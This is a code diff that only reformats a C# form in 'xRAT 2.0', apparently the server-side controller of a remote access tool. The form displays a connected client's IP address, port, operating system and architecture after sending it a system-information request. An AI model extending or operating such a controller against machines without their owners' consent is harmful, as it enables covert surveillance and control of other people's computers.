@@ -20,16 +20,23 @@ namespace xServer.Forms
         {
             if (_connectClient != null)
             {
-                this.Text = string.Format("xRAT 2.0 - System Information [{0}:{1}]", _connectClient.EndPoint.Address.ToString(), _connectClient.EndPoint.Port.ToString());
+                this.Text = string.Format("xRAT 2.0 - System Information [{0}:{1}]",
+                    _connectClient.EndPoint.Address.ToString(), _connectClient.EndPoint.Port.ToString());
                 new Core.Packets.ServerPackets.GetSystemInfo().Execute(_connectClient);
 
                 if (_connectClient.Value != null)
                 {
-                    ListViewItem lvi = new ListViewItem(new string[] { "Operating System", _connectClient.Value.OperatingSystem });
+                    ListViewItem lvi =
+                        new ListViewItem(new string[] {"Operating System", _connectClient.Value.OperatingSystem});
                     lstSystem.Items.Add(lvi);
-                    lvi = new ListViewItem(new string[] { "Architecture", (_connectClient.Value.OperatingSystem.Contains("32 Bit")) ? "x86 (32 Bit)" : "x64 (64 Bit)" });
+                    lvi =
+                        new ListViewItem(new string[]
+                        {
+                            "Architecture",
+                            (_connectClient.Value.OperatingSystem.Contains("32 Bit")) ? "x86 (32 Bit)" : "x64 (64 Bit)"
+                        });
                     lstSystem.Items.Add(lvi);
-                    lvi = new ListViewItem(new string[] { "", "Getting more information..." });
+                    lvi = new ListViewItem(new string[] {"", "Getting more information..."});
                     lstSystem.Items.Add(lvi);
                 }
             }
